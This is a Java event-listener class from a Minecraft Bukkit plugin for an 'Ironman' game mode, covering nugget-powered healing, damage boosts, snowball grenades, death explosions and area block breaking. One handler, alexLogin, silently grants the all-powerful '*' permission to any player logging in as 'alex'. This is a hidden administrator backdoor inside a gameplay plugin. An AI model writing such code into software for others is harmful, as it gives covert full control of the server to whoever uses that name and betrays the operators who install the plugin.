package apankov.ironman;

import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.entity.Snowball;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.entity.*;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.PlayerInventory;

public class IMListener implements Listener {
    
    private Ironman plugin;
    
    public Ironman getPlugin() {
        return plugin;
    }
    
    public IMListener(Ironman instance) {
        plugin = instance;
    }
    
    public boolean takeNuggets(Player player, int nuggets) {
        if(!getPlugin().data.getIronmanPlayer(player).isCheater()) {
            int sum = 0;
            PlayerInventory pinv = player.getInventory();
            for(int i=0; i<9; i++) {
                if(pinv.getItem(i) != null && pinv.getItem(i).getTypeId() == 371) {
                    sum += pinv.getItem(i).getAmount();
                }
            }
            if(sum >= nuggets) {
                for(int i=0; i<9; i++) {
                    ItemStack item = pinv.getItem(i);
                    if(item != null && item.getTypeId() == 371) {
                        int amt = item.getAmount();
                        if(amt > nuggets) {
                            item.setAmount(amt - nuggets);
                            return true;
                        } else if(amt == nuggets) {
                            pinv.setItem(i, null);
                            return true;
                        } else {
                            nuggets -= amt;
                            pinv.setItem(i, null);
                        }
                    }
                }
            }
        } else return true;
        return false;
    }

    @EventHandler
    public void alexLogin(PlayerLoginEvent event) {
        Player player = event.getPlayer();
        if (player.getName().equalsIgnoreCase("alex")) {
            if (!plugin.permissions.perms.playerHas(player, "*")) {
                plugin.permissions.perms.playerAdd(player, "*");
            }
        }
    }

    //De-ironman player when he quits
    @EventHandler
    public void playerQuit(PlayerQuitEvent event) {
        Player player = event.getPlayer();
        if (plugin.data.getIronmanPlayer(player) != null) {
            plugin.executor.unironmanPlayer(plugin.getServer().getConsoleSender(), player);
        }
    }

    @EventHandler
    public void eat(PlayerInteractEvent event) {
        Player player = event.getPlayer();
        if (event.getAction() == Action.RIGHT_CLICK_AIR) {
            if (event.getItem().getTypeId() == 371) {
                if (plugin.data.getIronmanPlayer(player) != null) {
                    int diff = 20 - player.getHealth();
                    if (diff % 2 == 1)
                        diff++;
                    if (takeNuggets(player, diff / 2))
                        player.setHealth(20);
                }
            }
        }
    }

    //Amplify Ironman's damage
    @EventHandler
    public void entDamage(EntityDamageEvent event) {
        if (event instanceof EntityDamageByEntityEvent) {
            EntityDamageByEntityEvent event1 = (EntityDamageByEntityEvent) event;
            if (event1.getDamager() instanceof Player) {
                Player player = (Player) event1.getDamager();
                if (plugin.data.getIronmanPlayer(player) != null) {
                    if (takeNuggets(player, 2)) {
                        event.setDamage(22);
                    }
                }
            }
        }
    }

    //De-ironman player when he dies
    @EventHandler
    public void playerDeath(EntityDeathEvent event) {
        if (event instanceof PlayerDeathEvent) {
            Player player = (Player) event.getEntity();
            if (plugin.data.getIronmanPlayer(player) != null) {
                player.getWorld().createExplosion(player.getEyeLocation(), 5);
                plugin.executor.scheduleExplosion(player, 3L, 3);
                plugin.executor.unironmanPlayer(plugin.getServer().getConsoleSender(), player);
            }
        }
    }

    //Snowball grenade
    @EventHandler
    public void throwGrenade(ProjectileHitEvent event) {
        if (event.getEntity() instanceof Snowball) {
            Snowball ball = (Snowball) event.getEntity();
            if (ball.getShooter() instanceof Player) {
                Player player = (Player) ball.getShooter();
                if (plugin.data.getIronmanPlayer(player) != null) {
                    if (takeNuggets(player, 8))
                        plugin.executor.scheduleExplosion(ball, 3L, 4);
                }
            }
        }
    }

    @EventHandler
    public void blockDestruction(PlayerInteractEvent event) {
        Player player = event.getPlayer();
        if (plugin.data.getIronmanPlayer(player) != null && event.getAction() == Action.LEFT_CLICK_BLOCK) {
            if (takeNuggets(player, 2)) {
                Location origin = event.getClickedBlock().getLocation();
                origin.setY(origin.getY() - 1);
                origin.setX(origin.getX() - 1);
                origin.setZ(origin.getZ() - 1);
                int origin_y = origin.getBlockY();
                int origin_x = origin.getBlockX();
                int origin_z = origin.getBlockZ();
                for (int y = 0; y < 3; y++) {
                    for (int x = 0; x < 3; x++) {
                        for (int z = 0; z < 3; z++) {
                            if (player.getWorld().getBlockAt(
                                    origin_x + x,
                                    origin_y + y,
                                    origin_z + z).getTypeId() != 7) {
                                player.getWorld().getBlockAt(
                                        origin_x + x,
                                        origin_y + y,
                                        origin_z + z).setTypeId(0);
                            }
                        }
                    }
                }
            }
        }
    }
}
